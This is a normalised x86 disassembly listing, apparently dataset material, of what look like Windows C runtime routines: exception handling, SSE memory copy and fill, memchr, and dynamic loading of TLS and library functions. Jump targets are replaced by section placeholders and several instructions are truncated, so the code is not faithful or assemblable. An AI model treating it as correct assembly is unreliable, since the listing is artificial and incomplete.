movsx esi [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4101ce
cmp esi [ ebp + 0x14 ]
jne r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_4134cc
inc [ eax + 0x18 ]
and [ ebp - 0x4 ] 0x0
call sub_4190e7
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] esi
call sub_40e2e6
retn
mov ecx [ ebp + 0x10 ]
cmp esi [ ecx + 0x4 ]
jge r-xdata
mov eax [ ecx + 0x8 ]
mov edx [ eax + esi * 8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + esi * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
push 0x103
push eax
mov eax [ ecx + 0x8 ]
push [ eax + esi * 8 + 0x4 ]
call sub_4135c0
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_4101e2
push ebp
mov ebp esp
push ebx
push esi
push edi
push [ ebp + 0x10 ]
call sub_401f50
pop ecx
call sub_4134cc
mov ecx [ ebp + 0x18 ]
xor esi esi
mov edx [ ebp + 0x8 ]
mov ebx 0x1fffffff
mov edi 0x19930522
cmp [ eax + 0x20 ] esi
jne r-xdata
test [ edx + 0x4 ] 0x66
je r-xdata
cmp [ edx ] 0xe06d7363
je r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
cmp [ edx ] 0x80000026
je r-xdata
cmp [ edx ] 0xe06d7363
jne r-xdata
mov eax [ ecx ]
and eax ebx
cmp eax 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ecx ]
and eax ebx
cmp eax edi
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_40f98e
add esp 0x20
cmp [ edx + 0x10 ] 0x3
jb r-xdata
cmp eax edi
jb r-xdata
cmp [ ecx + 0x1c ] esi
jne r-xdata
push 0xffffffff
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_41011a
add esp 0x10
jmp r-xdata
test [ ecx + 0x20 ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] edi
jbe r-xdata
test [ ecx + 0x20 ] 0x4
je r-xdata
mov eax [ edx + 0x1c ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
movzx eax [ ebp + 0x24 ]
push eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ecx
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call j_sub_401f50
call esi
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4102de
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov eax [ edx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea ecx [ eax + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
test [ edx ] 0x80
mov edi [ ebp + 0xc ]
je r-xdata
mov ebx [ edi + 0x4 ]
xor esi esi
cmp eax ebx
je r-xdata
test [ edi ] 0x10
jne r-xdata
test [ edi ] 0x2
je r-xdata
lea eax [ ebx + 0x8 ]
mov eax [ ebp + 0x10 ]
test [ eax ] 0x1
je r-xdata
test [ edx ] 0x8
je r-xdata
sbb eax eax
or eax 0x1
test bl bl
je r-xdata
test [ eax ] 0x2
je r-xdata
test [ edx ] 0x1
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax esi
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ eax + 0x1 ]
jne r-xdata
xor esi esi
inc esi
test [ edx ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test eax eax
je r-xdata
add ecx 0x2
add eax 0x2
test bl bl
jne r-xdata
mov bl [ ecx ]
cmp bl [ eax ]
jne r-xdata
sub_410380
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x20
jb r-xdata
cmp edi eax
jb r-xdata
and ecx 0x1f
je r-xdata
cmp ecx 0x80
jae r-xdata
lea esi [ ecx + esi ]
lea edi [ ecx + edi ]
cmp ecx 0x20
jb r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax ecx
shr ecx 0x2
je r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
test ecx 0xfffffffc
je r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
add edi 0x4
add esi 0x4
sub ecx 0x1
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
[ edi ] [ esi ]
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test ecx ecx
je r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
sub edi 0x4
sub esi 0x4
mov eax [ esi ]
mov [ edi ] eax
sub ecx 0x4
test ecx 0xfffffffc
jne r-xdata
test edi 0xf
je r-xdata
test edi 0x3
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov edx ecx
shr edx 0x5
test edx edx
je r-xdata
test edi 0x3
je r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
sub edi 0x1
sub esi 0x1
mov al [ esi ]
mov [ edi ] al
sub ecx 0x1
jne r-xdata
cmp ecx 0x80
jb r-xdata
dec ecx
dec esi
dec edi
mov al [ esi ]
mov [ edi ] al
test edi 0xf
jne r-xdata
cmp ecx 0x20
jb r-xdata
mov edx edi
and edx 0x3
sub ecx edx
lea esp [ esp ]
lea ecx [ ecx ]
test edi 0x3
jne r-xdata
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
lea ebx [ ebx ]
mov edx ecx
cmp ecx 0x20
jb r-xdata
mov al [ esi ]
mov [ edi ] al
dec ecx
add esi 0x1
add edi 0x1
test edi 0x3
jne r-xdata
cmp ecx 0x20
jb r-xdata
sub esi 0x80
sub edi 0x80
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu xmm2 [ esi + 0x20 ]
movdqu xmm3 [ esi + 0x30 ]
movdqu xmm4 [ esi + 0x40 ]
movdqu xmm5 [ esi + 0x50 ]
movdqu xmm6 [ esi + 0x60 ]
movdqu xmm7 [ esi + 0x70 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
movdqu [ edi + 0x20 ] xmm2
movdqu [ edi + 0x30 ] xmm3
movdqu [ edi + 0x40 ] xmm4
movdqu [ edi + 0x50 ] xmm5
movdqu [ edi + 0x60 ] xmm6
movdqu [ edi + 0x70 ] xmm7
sub ecx 0x80
test ecx 0xffffff80
jne r-xdata
mov edx ecx
shr ecx 0x2
and edx 0x3
sub esi 0x4
sub edi 0x4
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + r-xdata ]
mov al [ esi - 0x1 ]
mov [ edi - 0x1 ] al
dec esi
dec edi
sub edx 0x1
jne r-xdata
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
lea esi [ esi + 0x20 ]
lea edi [ edi + 0x20 ]
dec edx
jne r-xdata
shr ecx 0x2
[ edi ] [ esi ]
and edx 0x3
jmp [ edx * 4 + r-xdata ]
sub esi 0x20
sub edi 0x20
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
sub ecx 0x20
test ecx 0xffffffe0
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
lea esp [ esp ]
mov edi edi
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov edi edi
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + r-xdata ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_410900
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_4109ad
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ edi ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] 0x0
mov ecx [ edi ]
test ecx ecx
je r-xdata
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ebx
push esi
lea ebx [ ecx + 0x1 ]
push ebx
call sub_413b61
mov esi eax
pop ecx
test esi esi
je r-xdata
push esi
call j_sub_41a3a5#2
pop ecx
pop esi
pop ebx
jmp r-xdata
push [ edi ]
push ebx
push esi
call sub_414f1a
mov eax [ ebp + 0xc ]
mov ecx esi
add esp 0xc
xor esi esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop edi
pop ebp
retn
sub_410a10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
pop esi
pop ebp
retn
push [ esi ]
call j_sub_41a3a5#2
pop ecx
sub_410a69
call sub_41360c
call sub_410fcf
call sub_413629
test al al
jne r-xdata
call sub_41356c
test al al
jne r-xdata
xor al al
retn
call sub_411199
mov al 0x1
retn
call sub_413665
jmp r-xdata
sub_410a97
push ebp
mov ebp esp
call sub_4111ac
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
call sub_41359f
call sub_413665
push 0x0
call sub_410ff5
pop ecx
sub_410ac0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0xc ]
add ecx edi
xor ecx [ eax + edi ]
pop edi
pop esi
pop ebp
jmp sub_40d56a
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40d56a
sub_410b00
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov eax [ ebx + 0x8 ]
lea esi [ ebx + 0x10 ]
xor eax [ rw-data ]
push esi
push eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x8 ] eax
call sub_410ac0
mov edi [ ebp + 0x10 ]
push edi
call sub_401f50
mov eax [ ebp + 0x8 ]
add esp 0xc
test [ eax + 0x4 ] 0x66
jne r-xdata
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] edi
mov edi [ ebx + 0xc ]
mov [ ebx - 0x4 ] eax
cmp edi 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_4137e7
mov ecx [ ebp - 0x8 ]
lea eax [ edi + 0x2 ]
lea eax [ edi + eax * 2 ]
mov ebx [ ecx + eax * 4 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x14 ] eax
test ecx ecx
je r-xdata
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_41379e
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
push esi
push [ ebp - 0x8 ]
call sub_410ac0
add esp 0x8
mov edi ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_4137ce
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] edi
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
push esi
push [ ebp - 0x8 ]
mov [ eax + 0xc ] ebx
call sub_410ac0
mov ecx [ ebp - 0x14 ]
add esp 0x8
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_4137b5
int3
jmp r-xdata
push r--data
call sub_4298f0
add esp 0x4
test eax eax
je r-xdata
push rw-data
push esi
mov edx edi
mov ecx eax
call sub_4137e7
mov eax [ ebp + 0xc ]
mov esi [ r--data ]
mov ecx esi
push 0x1
push [ ebp + 0x8 ]
call j_sub_401f50
call esi
mov esi [ ebp - 0x10 ]
add esp 0x8
sub_410c77
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
push esi
push edi
lea ebx [ eax * 4 + rw-data ]
xor eax eax
[ ebx ] ecx
mov edx [ rw-data ]
or edi 0xffffffff
mov ecx edx
mov esi edx
and ecx 0x1f
xor esi eax
ror esi cl
cmp esi edi
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x14 ]
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
push [ esi ]
call sub_410d17
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax edx
push 0x20
and eax 0x1f
pop ecx
sub ecx eax
ror edi cl
xor edi edx
xchg [ ebx ] edi
push [ ebp + 0xc ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
add esi 0x4
cmp esi [ ebp + 0x14 ]
jne r-xdata
mov edx [ rw-data ]
push esi
call sub_410c5a
pop ecx
xchg [ ebx ] eax
jmp r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
sub_410d17
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
push edi
xor eax eax
lea edi [ ebx * 4 + rw-data ]
[ edi ] ecx
mov ecx eax
test ecx ecx
je r-xdata
mov ebx [ ebx * 4 + r--data ]
push esi
push 0x800
push 0x0
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
neg eax
sbb eax eax
and eax ecx
jmp r-xdata
mov eax esi
xchg [ edi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
pop edi
pop ebx
pop ebp
retn
mov eax esi
push esi
call [ FreeLibrary@IAT ]
xor esi esi
push esi
push esi
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
jmp r-xdata
or eax 0xffffffff
xchg [ edi ] eax
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
pop esi
sub_410d98
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x0
call sub_410c77
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_401f50
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410dd8
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x1
call sub_410c77
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x18 ]
mov ecx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_401f50
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410e1b
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x2
call sub_410c77
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call j_sub_401f50
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410e55
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x3
call sub_410c77
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x20 ]
mov ecx esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_401f50
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410e9e
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x4
call sub_410c77
mov esi eax
add esp 0x10
test esi esi
je r-xdata
pop esi
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call j_sub_401f50
call esi
pop esi
pop ebp
retn
sub_410ed8
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x5
call sub_410c77
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsFree@IAT ]
mov ecx esi
call j_sub_401f50
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410f12
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x6
call sub_410c77
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsGetValue@IAT ]
mov ecx esi
call j_sub_401f50
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410f4c
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x7
call sub_410c77
add esp 0x10
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsSetValue@IAT ]
mov ecx esi
call j_sub_401f50
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410f89
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x8
call sub_410c77
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_401f50
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410fcf
mov eax [ rw-data ]
push edi
push 0x20
and eax 0x1f
mov edi rw-data
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
push 0x9
pop ecx
[ edi ]
pop edi
retn
sub_410ff5
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push esi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jne r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
cmp [ esi ] 0x0
je r-xdata
pop esi
and [ esi ] 0x0
push [ esi ]
call [ FreeLibrary@IAT ]
sub_411027
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
push esi
push edi
push [ ebp + 0x8 ]
call [ GetModuleFileNameW@IAT ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax eax
jne r-xdata
cmp eax esi
jne r-xdata
xor ecx ecx
mov [ edi ] cx
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ edi + esi * 2 - 0x2 ] ax
sub_411061
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20c ]
push 0x104
push ecx
push eax
call sub_411027
add esp 0xc
cmp [ rw-data ] 0x5
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
push edi
push 0x2000
push 0x0
mov edi rw-data
push edi
call sub_40119b
add esp 0xc
test al al
je r-xdata
pop edi
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_4010a7
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call sub_4010df
lea eax [ ebp - 0x24c ]
push eax
push 0x4
push 0x0
push 0x0
push r--data
push edi
call sub_4011d7
add esp 0x28
sub_4110fd
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20c ]
push 0x104
push ecx
push eax
call sub_411027
add esp 0xc
cmp [ rw-data ] 0x5
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
push edi
push 0x2000
push 0x0
mov edi rw-data
push edi
call sub_40119b
add esp 0xc
test al al
je r-xdata
pop edi
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_4010a7
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call sub_4010df
lea eax [ ebp - 0x24c ]
push eax
push 0x4
push 0x0
push 0x0
push r--data
push edi
call sub_4011d7
add esp 0x28
sub_4111b8
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] edi
test edi edi
je r-xdata
test [ edi ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test [ edi ] 0x8
je r-xdata
mov ecx [ ebx ]
sub ecx 0x4
push ecx
mov eax [ ecx ]
mov esi [ eax + 0x20 ]
mov ecx esi
mov edi [ eax + 0x18 ]
call j_sub_401f50
call esi
mov [ ebp - 0xc ] 0x1994000
sub_411230
mov ecx [ esp + 0xc ]
movzx eax [ esp + 0x8 ]
mov edx edi
mov edi [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x4 ]
mov edi edx
retn
imul eax eax 0x1010101
cmp ecx 0x20
jle r-xdata
test ecx 0x3
je r-xdata
cmp ecx 0x80
jl r-xdata
test ecx 0x4
je r-xdata
mov [ edi ] al
inc edi
sub ecx 0x1
test ecx 0x3
jne r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jae r-xdata
test ecx 0xfffffff8
je r-xdata
mov [ edi ] eax
add edi 0x4
sub ecx 0x4
movd xmm0 eax
pshufd xmm0 xmm0 0x0
bt [ rw-data ] 0x1
jae r-xdata
[ edi ]
mov eax [ esp + 0x4 ]
mov edi edx
retn
lea esp [ esp ]
lea ebx [ ebx ]
lea edi [ ecx + edi - 0x20 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm0
mov eax [ esp + 0x4 ]
mov edi edx
retn
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm0
add edi 0x20
sub ecx 0x20
cmp ecx 0x20
jae r-xdata
movd xmm0 eax
pshufd xmm0 xmm0 0x0
add ecx edi
movups [ edi ] xmm0
add edi 0x10
and edi 0xfffffff0
sub ecx edi
cmp ecx 0x80
jle r-xdata
mov [ edi ] eax
mov [ edi + 0x4 ] eax
add edi 0x8
sub ecx 0x8
test ecx 0xfffffff8
jne r-xdata
test ecx 0x1f
je r-xdata
lea esp [ esp ]
lea esp [ esp ]
nop
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
sub ecx 0x80
